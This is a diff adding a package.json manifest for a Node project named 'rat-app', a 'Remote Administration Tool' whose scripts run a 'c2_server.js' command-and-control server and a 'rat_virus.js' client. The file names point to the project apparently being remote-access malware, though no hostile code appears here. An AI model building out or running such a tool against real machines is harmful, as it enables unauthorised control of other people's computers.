@@ -1,0 +1,18 @@
+{
+  "name": "rat-app",
+  "version": "1.0.0",
+  "description": "Remote Administration Tool",
+  "main": "c2_server.js",
+  "scripts": {
+    "start": "node c2_server.js",
+    "client": "node rat_virus.js",
+    "install-all": "npm install && node c2_server.js"
+  },
+  "dependencies": {
+    "cors": "^2.8.5",
+    "express": "^4.18.2",
+    "multer": "^2.4.0",
+    "socket.io": "^4.7.2",
+    "socket.io-client": "^4.8.4"
+  }
+}
